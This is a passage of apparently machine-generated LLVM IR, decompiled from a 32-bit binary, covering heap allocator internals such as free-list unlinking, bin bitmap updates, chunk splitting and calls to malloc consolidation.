  %v3_80602bc = load i32, i32* %v2_80602bc, align 4
  store i32 %v3_80602bc, i32* @ebx, align 4
  %v0_80602bf = load i32, i32* @edi, align 4
  %v2_80602bf = add i32 %v3_80602bc, 4
  %v3_80602bf = inttoptr i32 %v2_80602bf to i32*
  %v4_80602bf = load i32, i32* %v3_80602bf, align 4
  %v10_80602bf = icmp ult i32 %v0_80602bf, %v4_80602bf
  %v1_80602c2 = icmp eq i1 %v10_80602bf, false
  br i1 %v1_80602c2, label %dec_label_pc_80602ca, label %dec_label_pc_80602e8

dec_label_pc_80602ca:                             ; preds = %dec_label_pc_80602bc
  %v1_80602cc = or i32 %v0_80602bf, 1
  store i32 %v1_80602cc, i32* %eax.global-to-local, align 4
  store i32 %v3_80602af, i32* %ebx.global-to-local, align 4
  %v2_80602e0101 = add i32 %v3_80602af, 4
  %v3_80602e0102 = inttoptr i32 %v2_80602e0101 to i32*
  %v4_80602e0103 = load i32, i32* %v3_80602e0102, align 4
  %v10_80602e0105 = icmp ult i32 %v1_80602cc, %v4_80602e0103
  br i1 %v10_80602e0105, label %dec_label_pc_80602d1, label %dec_label_pc_80602e5

dec_label_pc_80602d1:                             ; preds = %dec_label_pc_80602ca, %dec_label_pc_80602d1
  %v0_80602e5106 = phi i32 [ %v3_80602d5, %dec_label_pc_80602d1 ], [ %v3_80602af, %dec_label_pc_80602ca ]
  store i32 %v0_80602e5106, i32* %ecx.global-to-local, align 4
  %v1_80602d5 = add i32 %v0_80602e5106, 8
  %v2_80602d5 = inttoptr i32 %v1_80602d5 to i32*
  %v3_80602d5 = load i32, i32* %v2_80602d5, align 4
  store i32 %v3_80602d5, i32* %ecx.global-to-local, align 4
  store i32 %v3_80602d5, i32* %ebx.global-to-local, align 4
  %v2_80602e0 = add i32 %v3_80602d5, 4
  %v3_80602e0 = inttoptr i32 %v2_80602e0 to i32*
  %v4_80602e0 = load i32, i32* %v3_80602e0, align 4
  %v10_80602e0 = icmp ult i32 %v1_80602cc, %v4_80602e0
  br i1 %v10_80602e0, label %dec_label_pc_80602d1, label %dec_label_pc_80602e5

dec_label_pc_80602e5:                             ; preds = %dec_label_pc_80602d1, %dec_label_pc_80602ca
  %v0_80602e5.lcssa = phi i32 [ %v3_80602af, %dec_label_pc_80602ca ], [ %v3_80602d5, %dec_label_pc_80602d1 ]
  %v1_80602e5 = add i32 %v0_80602e5.lcssa, 12
  %v2_80602e5 = inttoptr i32 %v1_80602e5 to i32*
  %v3_80602e5 = load i32, i32* %v2_80602e5, align 4
  store i32 %v3_80602e5, i32* @ebx, align 4
  br label %dec_label_pc_80602e8

dec_label_pc_80602e8:                             ; preds = %dec_label_pc_806028e, %dec_label_pc_80602bc, %dec_label_pc_806029f, %dec_label_pc_80602e5
  %v0_80602e8 = phi i32 [ %v0_80602a1, %dec_label_pc_806029f ], [ %v0_80602a1, %dec_label_pc_80602e5 ], [ %v0_80602a1, %dec_label_pc_80602bc ], [ %v2_8060290, %dec_label_pc_806028e ]
  %stack_var_-64.1 = phi i32 [ %v3_80602af, %dec_label_pc_806029f ], [ %v0_80602e5.lcssa, %dec_label_pc_80602e5 ], [ %v2_80602a8, %dec_label_pc_80602bc ], [ %v3_806029a, %dec_label_pc_806028e ]
  %v1_80602ea = urem i32 %v0_80602e8, 32
  %v2_80602ea = icmp eq i32 %v1_80602ea, 0
  store i32 %v1_80602ea, i32* %esi.global-to-local, align 4
  store i32 %v1_80602ea, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_80602f4 = sdiv i32 %v0_80602e8, 32
  store i32 %v2_80602f4, i32* %edx.global-to-local, align 4
  br i1 %v2_80602ea, label %bb82, label %bb

bb:                                               ; preds = %dec_label_pc_80602e8
  %v5_80602f7 = shl i32 1, %v1_80602ea
  store i32 %v5_80602f7, i32* %eax.global-to-local, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_80602e8, %bb
  %v5_80602f9 = phi i32 [ 1, %dec_label_pc_80602e8 ], [ %v5_80602f7, %bb ]
  %v1_80602f9 = mul nsw i32 %v2_80602f4, 4
  %v2_80602f9 = add i32 %v1_80602f9, ptrtoint (i32* @global_var_807f734.686 to i32)
  %v3_80602f9 = inttoptr i32 %v2_80602f9 to i32*
  %v4_80602f9 = load i32, i32* %v3_80602f9, align 4
  %v6_80602f9 = or i32 %v4_80602f9, %v5_80602f9
  store i32 %v6_80602f9, i32* %v3_80602f9, align 4
  %v0_8060300 = load i32, i32* @ebx, align 4
  %v1_8060300 = load i32, i32* @ebp, align 4
  %v2_8060300 = add i32 %v1_8060300, 12
  %v3_8060300 = inttoptr i32 %v2_8060300 to i32*
  store i32 %v0_8060300, i32* %v3_8060300, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_8060307 = load i32, i32* @ebp, align 4
  %v2_8060307 = add i32 %v1_8060307, 8
  %v3_8060307 = inttoptr i32 %v2_8060307 to i32*
  store i32 %stack_var_-64.1, i32* %v3_8060307, align 4
  %v0_806030a = load i32, i32* @ebp, align 4
  %v1_806030a = load i32, i32* @esi, align 4
  %v2_806030a = add i32 %v1_806030a, 12
  %v3_806030a = inttoptr i32 %v2_806030a to i32*
  store i32 %v0_806030a, i32* %v3_806030a, align 4
  %v0_806030d = load i32, i32* @ebp, align 4
  %v1_806030d = load i32, i32* @ebx, align 4
  %v2_806030d = add i32 %v1_806030d, 8
  %v3_806030d = inttoptr i32 %v2_806030d to i32*
  store i32 %v0_806030d, i32* %v3_806030d, align 4
  %v0_8060310 = load i32, i32* @global_var_807f440.685, align 64
  store i32 %v0_8060310, i32* @ebp, align 4
  %v9_8060316 = icmp eq i32 %v0_8060310, 134738996
  %v1_806031c = icmp eq i1 %v9_8060316, false
  br i1 %v1_806031c, label %dec_label_pc_806023f, label %dec_label_pc_8060322

dec_label_pc_8060322:                             ; preds = %bb82, %dec_label_pc_8060310.preheader
  br i1 %v8_80601d3, label %dec_label_pc_80603b0, label %dec_label_pc_8060330

dec_label_pc_8060330:                             ; preds = %dec_label_pc_8060322
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_8060334 = mul i32 %stack_var_-40.0.ph, 8
  %v2_8060334 = add i32 %v1_8060334, ptrtoint (i32* @global_var_807f42c.682 to i32)
  store i32 %v2_8060334, i32* %edx.global-to-local, align 4
  %v1_806033b = add i32 %v1_8060334, add (i32 ptrtoint (i32* @global_var_807f42c.682 to i32), i32 12)
  %v2_806033b = inttoptr i32 %v1_806033b to i32*
  %storemerge1.pre = load i32, i32* %v2_806033b, align 4
  br label %dec_label_pc_80603ac

dec_label_pc_8060340:                             ; preds = %dec_label_pc_80603ac
  %v1_8060340 = add i32 %v4_8060357, 4
  %v2_8060340 = inttoptr i32 %v1_8060340 to i32*
  %v3_8060340 = load i32, i32* %v2_8060340, align 4
  store i32 %v3_8060340, i32* %ebx.global-to-local, align 4
  %v1_8060343 = add i32 %v4_8060357, 12
  %v2_8060343 = inttoptr i32 %v1_8060343 to i32*
  %v3_8060343 = load i32, i32* %v2_8060343, align 4
  store i32 %v3_8060343, i32* @ecx, align 4
  %v1_8060346 = and i32 %v3_8060340, -4
  store i32 %v1_8060346, i32* @ebx, align 4
  %v10_8060349 = icmp ult i32 %v1_8060346, %v1_806052a
  br i1 %v10_8060349, label %dec_label_pc_80603ac, label %dec_label_pc_806034f

dec_label_pc_806034f:                             ; preds = %dec_label_pc_8060340
  %v1_806034f = add i32 %v4_8060357, 8
  %v2_806034f = inttoptr i32 %v1_806034f to i32*
  %v3_806034f = load i32, i32* %v2_806034f, align 4
  store i32 %v3_806034f, i32* @edx, align 4
  %v1_8060352 = add i32 %v3_806034f, 12
  %v2_8060352 = inttoptr i32 %v1_8060352 to i32*
  %v3_8060352 = load i32, i32* %v2_8060352, align 4
  %v15_8060352 = icmp eq i32 %v3_8060352, %v4_8060357
  %v1_8060355 = icmp eq i1 %v15_8060352, false
  br i1 %v1_8060355, label %dec_label_pc_806035c, label %dec_label_pc_8060357

dec_label_pc_8060357:                             ; preds = %dec_label_pc_806034f
  %v1_8060357 = add i32 %v3_8060343, 8
  %v2_8060357 = inttoptr i32 %v1_8060357 to i32*
  %v3_8060357 = load i32, i32* %v2_8060357, align 4
  %v15_8060357 = icmp eq i32 %v3_8060357, %v4_8060357
  br i1 %v15_8060357, label %dec_label_pc_8060361, label %dec_label_pc_806035c

dec_label_pc_806035c:                             ; preds = %dec_label_pc_8060357, %dec_label_pc_806034f
  %v0_806035c = call i32 @abort()
  store i32 %v0_806035c, i32* %eax.global-to-local, align 4
  %v0_8060361.pre = load i32, i32* @ebx, align 4
  %v0_8060367.pre = load i32, i32* @ecx, align 4
  %v1_8060367.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8060361

dec_label_pc_8060361:                             ; preds = %dec_label_pc_8060357, %dec_label_pc_806035c
  %v1_8060367 = phi i32 [ %v3_806034f, %dec_label_pc_8060357 ], [ %v1_8060367.pre, %dec_label_pc_806035c ]
  %v0_8060367 = phi i32 [ %v3_8060343, %dec_label_pc_8060357 ], [ %v0_8060367.pre, %dec_label_pc_806035c ]
  %v0_8060361 = phi i32 [ %v1_8060346, %dec_label_pc_8060357 ], [ %v0_8060361.pre, %dec_label_pc_806035c ]
  %v5_8060363 = sub i32 %v0_8060361, %v1_806052a
  store i32 %v5_8060363, i32* %esi.global-to-local, align 4
  %v2_8060367 = add i32 %v1_8060367, 12
  %v3_8060367 = inttoptr i32 %v2_8060367 to i32*
  store i32 %v0_8060367, i32* %v3_8060367, align 4
  %v0_806036a = load i32, i32* @edx, align 4
  %v1_806036a = load i32, i32* @ecx, align 4
  %v2_806036a = add i32 %v1_806036a, 8
  %v3_806036a = inttoptr i32 %v2_806036a to i32*
  store i32 %v0_806036a, i32* %v3_806036a, align 4
  %v0_806036d = load i32, i32* %eax.global-to-local, align 4
  %v1_806036d = add i32 %v0_806036d, 8
  store i32 %v1_806036d, i32* @ecx, align 4
  %v0_8060370 = load i32, i32* %esi.global-to-local, align 4
  %tmp137 = icmp ult i32 %v0_8060370, 16
  br i1 %tmp137, label %dec_label_pc_806089f, label %dec_label_pc_8060379

dec_label_pc_8060379:                             ; preds = %dec_label_pc_8060361
  %v2_806037d = add i32 %v0_806036d, %v1_806052a
  store i32 %v2_806037d, i32* %edx.global-to-local, align 4
  %v1_8060380 = or i32 %v1_806052a, 1
  store i32 %v1_8060380, i32* %ebx.global-to-local, align 4
  %v2_8060383 = add i32 %v0_806036d, 4
  %v3_8060383 = inttoptr i32 %v2_8060383 to i32*
  store i32 %v1_8060380, i32* %v3_8060383, align 4
  %v0_8060386 = load i32, i32* %esi.global-to-local, align 4
  %v1_8060388 = or i32 %v0_8060386, 1
  store i32 %v1_8060388, i32* %eax.global-to-local, align 4
  %v0_806038b = load i32, i32* %edx.global-to-local, align 4
  %v1_806038b = load i32, i32* @ebp, align 4
  %v2_806038b = add i32 %v1_806038b, 8
  %v3_806038b = inttoptr i32 %v2_806038b to i32*
  store i32 %v0_806038b, i32* %v3_806038b, align 4
  %v0_806038e = load i32, i32* %edx.global-to-local, align 4
  %v1_806038e = load i32, i32* @ebp, align 4
  %v2_806038e = add i32 %v1_806038e, 12
  %v3_806038e = inttoptr i32 %v2_806038e to i32*
  store i32 %v0_806038e, i32* %v3_806038e, align 4
  %v0_8060391 = load i32, i32* %edx.global-to-local, align 4
  %v1_8060391 = add i32 %v0_8060391, 8
  %v2_8060391 = inttoptr i32 %v1_8060391 to i32*
  store i32 ptrtoint (i32* @global_var_807f434.684 to i32), i32* %v2_8060391, align 4
  %v0_8060398 = load i32, i32* %edx.global-to-local, align 4
  %v1_8060398 = add i32 %v0_8060398, 12
  %v2_8060398 = inttoptr i32 %v1_8060398 to i32*
  store i32 ptrtoint (i32* @global_var_807f434.684 to i32), i32* %v2_8060398, align 4
  %v0_806039f = load i32, i32* %eax.global-to-local, align 4
  %v1_806039f = load i32, i32* %edx.global-to-local, align 4
  %v2_806039f = add i32 %v1_806039f, 4
  %v3_806039f = inttoptr i32 %v2_806039f to i32*
  store i32 %v0_806039f, i32* %v3_806039f, align 4
  %v0_80603a2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80603a2 = load i32, i32* %edx.global-to-local, align 4
  %v3_80603a2 = add i32 %v1_80603a2, %v0_80603a2
  %v4_80603a2 = inttoptr i32 %v3_80603a2 to i32*
  store i32 %v0_80603a2, i32* %v4_80603a2, align 4
  br label %dec_label_pc_80608a4

dec_label_pc_80603ac:                             ; preds = %dec_label_pc_8060340, %dec_label_pc_8060330
  %v4_8060357 = phi i32 [ %storemerge1.pre, %dec_label_pc_8060330 ], [ %v3_8060343, %dec_label_pc_8060340 ]
  store i32 %v4_8060357, i32* %eax.global-to-local, align 4
  %v12_80603ac = icmp eq i32 %v4_8060357, %v2_8060334
  %v1_80603ae = icmp eq i1 %v12_80603ac, false
  br i1 %v1_80603ae, label %dec_label_pc_8060340, label %dec_label_pc_80603b0.loopexit

dec_label_pc_80603b0.loopexit:                    ; preds = %dec_label_pc_80603ac
  br label %dec_label_pc_80603b0

dec_label_pc_80603b0:                             ; preds = %dec_label_pc_80603b0.loopexit, %dec_label_pc_8060322
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_80603b9 = add i32 %stack_var_-40.0.ph, 1
  store i32 %v1_80603b9, i32* %ecx.global-to-local, align 4
  %v2_80603bc = udiv i32 %v1_80603b9, 32
  store i32 %v2_80603bc, i32* @edi, align 4
  %v1_80603bf = mul nuw nsw i32 %v2_80603bc, 4
  %v2_80603bf = add i32 %v1_80603bf, ptrtoint (i32* @global_var_807f734.686 to i32)
  %v3_80603bf = inttoptr i32 %v2_80603bf to i32*
  %v4_80603bf = load i32, i32* %v3_80603bf, align 4
  store i32 %v4_80603bf, i32* %edx.global-to-local, align 4
  %v1_80603c6 = mul i32 %v1_80603b9, 8
  %v2_80603c6 = add i32 %v1_80603c6, ptrtoint (i32* @global_var_807f42c.682 to i32)
  store i32 %v2_80603c6, i32* %ebx.global-to-local, align 4
  %v1_80603cd = urem i32 %v1_80603b9, 32
  %v2_80603cd = icmp eq i32 %v1_80603cd, 0
  store i32 %v1_80603cd, i32* %ecx.global-to-local, align 4
  br i1 %v2_80603cd, label %.preheader, label %bb83

bb83:                                             ; preds = %dec_label_pc_80603b0
  %v5_80603d0 = shl i32 1, %v1_80603cd
  store i32 %v5_80603d0, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_80603b0, %bb83, %dec_label_pc_8060411
  %v1_80603d2 = phi i32 [ %v1_80603d2.pre, %dec_label_pc_8060411 ], [ %v4_80603bf, %bb83 ], [ %v4_80603bf, %dec_label_pc_80603b0 ]
  %v0_80603d6 = phi i32 [ %v0_80603d2.pre, %dec_label_pc_8060411 ], [ %v5_80603d0, %bb83 ], [ 1, %dec_label_pc_80603b0 ]
  %tmp84 = icmp ule i32 %v0_80603d6, %v1_80603d2
  %v1_80603d6 = icmp eq i32 %v0_80603d6, 0
  %v1_80603d8 = icmp eq i1 %v1_80603d6, false
  %or.cond = and i1 %tmp84, %v1_80603d8
  br i1 %or.cond, label %dec_label_pc_80603d6.dec_label_pc_8060406.preheader_crit_edge, label %dec_label_pc_80603da.preheader

dec_label_pc_80603d6.dec_label_pc_8060406.preheader_crit_edge: ; preds = %.preheader
  %v0_806040112.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8060406.preheader

dec_label_pc_80603da.preheader:                   ; preds = %.preheader
  %v0_80603da.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80603da

dec_label_pc_80603da:                             ; preds = %dec_label_pc_80603da.preheader, %dec_label_pc_80603e4
  %v0_80603da = phi i32 [ %v0_80603da.pre, %dec_label_pc_80603da.preheader ], [ %v1_80603da, %dec_label_pc_80603e4 ]
  %v1_80603da = add i32 %v0_80603da, 1
  store i32 %v1_80603da, i32* @edi, align 4
  %v6_80603de = icmp ugt i32 %v1_80603da, 2
  br i1 %v6_80603de, label %dec_label_pc_8060495.loopexit, label %dec_label_pc_80603e4

dec_label_pc_80603e4:                             ; preds = %dec_label_pc_80603da
  %v1_80603e4 = mul i32 %v1_80603da, 4
  %v2_80603e4 = add i32 %v1_80603e4, ptrtoint (i32* @global_var_807f734.686 to i32)
  %v3_80603e4 = inttoptr i32 %v2_80603e4 to i32*
  %v4_80603e4 = load i32, i32* %v3_80603e4, align 4
  store i32 %v4_80603e4, i32* %edx.global-to-local, align 4
  %v1_80603eb = icmp eq i32 %v4_80603e4, 0
  br i1 %v1_80603eb, label %dec_label_pc_80603da, label %dec_label_pc_80603ef

dec_label_pc_80603ef:                             ; preds = %dec_label_pc_80603e4
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_80603f6 = mul i32 %v1_80603da, 256
  store i32 %v2_80603f6, i32* %eax.global-to-local, align 4
  %v1_80603f9 = add i32 %v2_80603f6, ptrtoint (i32* @global_var_807f42c.682 to i32)
  store i32 %v1_80603f9, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8060406.preheader

dec_label_pc_8060406.preheader:                   ; preds = %dec_label_pc_80603d6.dec_label_pc_8060406.preheader_crit_edge, %dec_label_pc_80603ef
  %v0_806040112 = phi i32 [ %v1_80603f9, %dec_label_pc_80603ef ], [ %v0_806040112.pre, %dec_label_pc_80603d6.dec_label_pc_8060406.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_80603ef ], [ %v0_80603d6, %dec_label_pc_80603d6.dec_label_pc_8060406.preheader_crit_edge ]
  %v0_8060417 = phi i32 [ %v4_80603e4, %dec_label_pc_80603ef ], [ %v1_80603d2, %dec_label_pc_80603d6.dec_label_pc_8060406.preheader_crit_edge ]
  %v2_80604064 = and i32 %v0_8060417, %esi.promoted
  %v3_80604065 = icmp eq i32 %v2_80604064, 0
  br i1 %v3_80604065, label %dec_label_pc_8060401, label %dec_label_pc_806040a

dec_label_pc_8060401:                             ; preds = %dec_label_pc_8060406.preheader, %dec_label_pc_8060401
  %v2_806040414 = phi i32 [ %v2_8060404, %dec_label_pc_8060401 ], [ %esi.promoted, %dec_label_pc_8060406.preheader ]
  %v0_806040113 = phi i32 [ %v1_8060401, %dec_label_pc_8060401 ], [ %v0_806040112, %dec_label_pc_8060406.preheader ]
  %v1_8060401 = add i32 %v0_806040113, 8
  %v2_8060404 = mul i32 %v2_806040414, 2
  %v2_8060406 = and i32 %v2_8060404, %v0_8060417
  %v3_8060406 = icmp eq i32 %v2_8060406, 0
  br i1 %v3_8060406, label %dec_label_pc_8060401, label %dec_label_pc_8060406.dec_label_pc_806040a_crit_edge

dec_label_pc_8060406.dec_label_pc_806040a_crit_edge: ; preds = %dec_label_pc_8060401
  store i32 %v1_8060401, i32* %ebx.global-to-local, align 4
  store i32 %v2_8060404, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_806040a

dec_label_pc_806040a:                             ; preds = %dec_label_pc_8060406.dec_label_pc_806040a_crit_edge, %dec_label_pc_8060406.preheader
  %v0_8060411 = phi i32 [ %v2_8060404, %dec_label_pc_8060406.dec_label_pc_806040a_crit_edge ], [ %esi.promoted, %dec_label_pc_8060406.preheader ]
  %v1_8060434 = phi i32 [ %v1_8060401, %dec_label_pc_8060406.dec_label_pc_806040a_crit_edge ], [ %v0_806040112, %dec_label_pc_8060406.preheader ]
  %v1_806040a = add i32 %v1_8060434, 12
  %v2_806040a = inttoptr i32 %v1_806040a to i32*
  %v3_806040a = load i32, i32* %v2_806040a, align 4
  store i32 %v3_806040a, i32* @ecx, align 4
  %v12_806040d = icmp eq i32 %v3_806040a, %v1_8060434
  %v1_806040f = icmp eq i1 %v12_806040d, false
  br i1 %v1_806040f, label %dec_label_pc_8060425, label %dec_label_pc_8060411

dec_label_pc_8060411:                             ; preds = %dec_label_pc_806040a
  %v2_8060413 = mul i32 %v0_8060411, 2
  store i32 %v2_8060413, i32* %esi.global-to-local, align 4
  %v1_8060415 = sub i32 -1, %v0_8060411
  store i32 %v1_8060415, i32* %eax.global-to-local, align 4
  %v2_8060417 = and i32 %v0_8060417, %v1_8060415
  store i32 %v2_8060417, i32* %edx.global-to-local, align 4
  %v1_8060419 = add i32 %v3_806040a, 8
  store i32 %v1_8060419, i32* %ebx.global-to-local, align 4
  %v1_806041c = load i32, i32* @edi, align 4
  %v2_806041c = mul i32 %v1_806041c, 4
  %v3_806041c = add i32 %v2_806041c, ptrtoint (i32* @global_var_807f734.686 to i32)
  %v4_806041c = inttoptr i32 %v3_806041c to i32*
  store i32 %v2_8060417, i32* %v4_806041c, align 4
  %v0_80603d2.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_80603d2.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8060425:                             ; preds = %dec_label_pc_806040a
  %v1_8060425 = add i32 %v3_806040a, 4
  %v2_8060425 = inttoptr i32 %v1_8060425 to i32*
  %v3_8060425 = load i32, i32* %v2_8060425, align 4
  store i32 %v3_8060425, i32* %edx.global-to-local, align 4
  %v1_8060428 = add i32 %v3_806040a, 12
  %v2_8060428 = inttoptr i32 %v1_8060428 to i32*
  %v3_8060428 = load i32, i32* %v2_8060428, align 4
  store i32 %v3_8060428, i32* %eax.global-to-local, align 4
  %v1_806042b = and i32 %v3_8060425, -4
  store i32 %v1_806042b, i32* %edx.global-to-local, align 4
  %v5_8060430 = sub i32 %v1_806042b, %v1_806052a
  store i32 %v5_8060430, i32* %esi.global-to-local, align 4
  store i32 %v3_8060428, i32* %v2_806040a, align 4
  %v0_8060437 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8060437 = load i32, i32* %eax.global-to-local, align 4
  %v2_8060437 = add i32 %v1_8060437, 8
  %v3_8060437 = inttoptr i32 %v2_8060437 to i32*
  store i32 %v0_8060437, i32* %v3_8060437, align 4
  %v0_806043a = load i32, i32* %esi.global-to-local, align 4
  %tmp138 = icmp ult i32 %v0_806043a, 16
  %v0_806043f = load i32, i32* @ecx, align 4
  br i1 %tmp138, label %dec_label_pc_806043f, label %dec_label_pc_8060446

dec_label_pc_806043f:                             ; preds = %dec_label_pc_8060425
  %v1_806043f = load i32, i32* %edx.global-to-local, align 4
  %v2_806043f = add i32 %v0_806043f, 4
  %v3_806043f = add i32 %v2_806043f, %v1_806043f
  %v4_806043f = inttoptr i32 %v3_806043f to i32*
  %v5_806043f = load i32, i32* %v4_806043f, align 4
  %v6_806043f = or i32 %v5_806043f, 1
  store i32 %v6_806043f, i32* %v4_806043f, align 4
  br label %dec_label_pc_806048d

dec_label_pc_8060446:                             ; preds = %dec_label_pc_8060425
  %v2_806044a = add i32 %v0_806043f, %v1_806052a
  store i32 %v2_806044a, i32* %eax.global-to-local, align 4
  %v1_8060453 = load i32, i32* @ebp, align 4
  %v2_8060453 = add i32 %v1_8060453, 8
  %v3_8060453 = inttoptr i32 %v2_8060453 to i32*
  store i32 %v2_806044a, i32* %v3_8060453, align 4
  %v0_8060456 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060456 = load i32, i32* @ebp, align 4
  %v2_8060456 = add i32 %v1_8060456, 12
  %v3_8060456 = inttoptr i32 %v2_8060456 to i32*
  store i32 %v0_8060456, i32* %v3_8060456, align 4
  %v0_8060459 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060459 = add i32 %v0_8060459, 8
  %v2_8060459 = inttoptr i32 %v1_8060459 to i32*
  store i32 ptrtoint (i32* @global_var_807f434.684 to i32), i32* %v2_8060459, align 4
  %v0_8060460 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060460 = add i32 %v0_8060460, 12
  %v2_8060460 = inttoptr i32 %v1_8060460 to i32*
  store i32 ptrtoint (i32* @global_var_807f434.684 to i32), i32* %v2_8060460, align 4
  %v0_8060467 = load i32, i32* @global_var_807f430.683, align 16
  %v4_806046d = load i32, i32* %eax.global-to-local, align 4
  %v5_806046d = select i1 %v8_80601d3, i32 %v4_806046d, i32 %v0_8060467
  %v4_8060470 = or i32 %v1_806052a, 1
  store i32 %v5_806046d, i32* @global_var_807f430.683, align 16
  %v0_806047b = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8060470, i32* %ebx.global-to-local, align 4
  %v1_8060481 = or i32 %v0_806047b, 1
  store i32 %v1_8060481, i32* %edx.global-to-local, align 4
  %v3_8060484 = add i32 %v0_806047b, %v4_806046d
  %v4_8060484 = inttoptr i32 %v3_8060484 to i32*
  store i32 %v0_806047b, i32* %v4_8060484, align 4
  %v0_8060487 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8060487 = load i32, i32* @ecx, align 4
  %v2_8060487 = add i32 %v1_8060487, 4
  %v3_8060487 = inttoptr i32 %v2_8060487 to i32*
  store i32 %v0_8060487, i32* %v3_8060487, align 4
  %v0_806048a = load i32, i32* %edx.global-to-local, align 4
  %v1_806048a = load i32, i32* %eax.global-to-local, align 4
  %v2_806048a = add i32 %v1_806048a, 4
  %v3_806048a = inttoptr i32 %v2_806048a to i32*
  store i32 %v0_806048a, i32* %v3_806048a, align 4
  br label %dec_label_pc_806048d

dec_label_pc_806048d:                             ; preds = %dec_label_pc_8060581, %dec_label_pc_806043f, %dec_label_pc_8060446
  %v0_806048d = load i32, i32* @ecx, align 4
  %v1_806048d = add i32 %v0_806048d, 8
  store i32 %v1_806048d, i32* @ebx, align 4
  br label %dec_label_pc_80608b5

dec_label_pc_8060495.loopexit:                    ; preds = %dec_label_pc_80603da
  br label %dec_label_pc_8060495

dec_label_pc_8060495:                             ; preds = %dec_label_pc_8060495.loopexit, %dec_label_pc_8060195, %dec_label_pc_806019d
  %v0_8060495 = load i32, i32* @global_var_807f42c.682, align 4
  store i32 %v0_8060495, i32* @ebx, align 4
  store i32 %v1_806052a, i32* %esi.global-to-local, align 4
  %v1_806049f = add i32 %v0_8060495, 4
  %v2_806049f = inttoptr i32 %v1_806049f to i32*
  %v3_806049f = load i32, i32* %v2_806049f, align 4
  %v1_80604a2 = add i32 %v1_806052a, 16
  store i32 %v1_80604a2, i32* @esi, align 4
  %v1_80604a9 = and i32 %v3_806049f, -4
  store i32 %v1_80604a9, i32* %ecx.global-to-local, align 4
  %v7_80604ac = icmp ult i32 %v1_80604a9, %v1_80604a2
  br i1 %v7_80604ac, label %dec_label_pc_80604cc, label %dec_label_pc_80604b0

dec_label_pc_80604b0:                             ; preds = %dec_label_pc_8060495
  %v2_80604b4 = add i32 %v0_8060495, %v1_806052a
  store i32 %v2_80604b4, i32* %edx.global-to-local, align 4
  %v1_80604b7 = or i32 %v1_806052a, 1
  store i32 %v1_80604b7, i32* %eax.global-to-local, align 4
  store i32 %v2_80604b4, i32* @global_var_807f42c.682, align 4
  store i32 %v1_80604b7, i32* %v2_806049f, align 4
  %v0_80604c3 = load i32, i32* %ecx.global-to-local, align 4
  %v5_80604c3 = sub i32 %v0_80604c3, %v1_806052a
  store i32 %v5_80604c3, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8060845

dec_label_pc_80604cc:                             ; preds = %dec_label_pc_8060495
  %v0_80604cc = load i8, i8* @global_var_807f400.681, align 1024
  %v1_80604cc = and i8 %v0_80604cc, 2
  %v2_80604cc = icmp eq i8 %v1_80604cc, 0
  %v0_80604d3 = load i32, i32* @global_var_807f75c.687, align 4
  store i32 %v0_80604d3, i32* %edx.global-to-local, align 4
  br i1 %v2_80604cc, label %dec_label_pc_8060500, label %dec_label_pc_80604db

dec_label_pc_80604db:                             ; preds = %dec_label_pc_80604cc
  store i32 ptrtoint (i8* @global_var_807f400.681 to i32), i32* %stack_var_-92, align 4
  %v2_80604e3 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_807f400.681 to i32*))
  store i32 ptrtoint (i8* @global_var_807f400.681 to i32), i32* @ebx, align 4
  %v1_80604ed = add i32 %v1_806052a, -7
  store i32 %v1_80604ed, i32* %eax.global-to-local, align 4
  store i32 %v1_80604ed, i32* %stack_var_-92, align 4
  %v1_80604f1 = call i32 @malloc(i32 %v1_80604ed)
  store i32 %v1_80604f1, i32* %eax.global-to-local, align 4
  store i32 %v1_80604f1, i32* @ebx, align 4
  br label %dec_label_pc_80608b5

dec_label_pc_8060500:                             ; preds = %dec_label_pc_80604cc
  store i32 %v1_806052a, i32* @ebx, align 4
  %v1_8060504 = add i32 %v0_80604d3, -1
  store i32 %v1_8060504, i32* @ecx, align 4
  %v1_8060507 = load i32, i32* @global_var_807f74c.688, align 4
  %v7_8060507 = icmp ult i32 %v1_806052a, %v1_8060507
  br i1 %v7_8060507, label %dec_label_pc_80605e2, label %dec_label_pc_8060517

dec_label_pc_8060517:                             ; preds = %dec_label_pc_8060500
  %v0_8060517 = load i32, i32* @global_var_807f750.689, align 16
  store i32 %v0_8060517, i32* %eax.global-to-local, align 4
  %v1_806051c = load i32, i32* @global_var_807f754.690, align 4
  %v5_8060522 = icmp slt i32 %v0_8060517, %v1_806051c
  br i1 %v5_8060522, label %dec_label_pc_8060528, label %dec_label_pc_80605e2

dec_label_pc_8060528:                             ; preds = %dec_label_pc_8060517
  %v2_806052a = add i32 %v1_806052a, 10
  %v3_806052a = add i32 %v2_806052a, %v0_80604d3
  %v1_806052e = sub i32 0, %v0_80604d3
  store i32 %v1_806052e, i32* %eax.global-to-local, align 4
  %v2_8060530 = and i32 %v3_806052a, %v1_806052e
  store i32 %v2_8060530, i32* @ebx, align 4
  %tmp139 = icmp ugt i32 %v2_8060530, %v1_806052a
  br i1 %tmp139, label %dec_label_pc_806053c, label %dec_label_pc_80605e2

dec_label_pc_806053c:                             ; preds = %dec_label_pc_8060528
  store i32 0, i32* %stack_var_-92, align 4
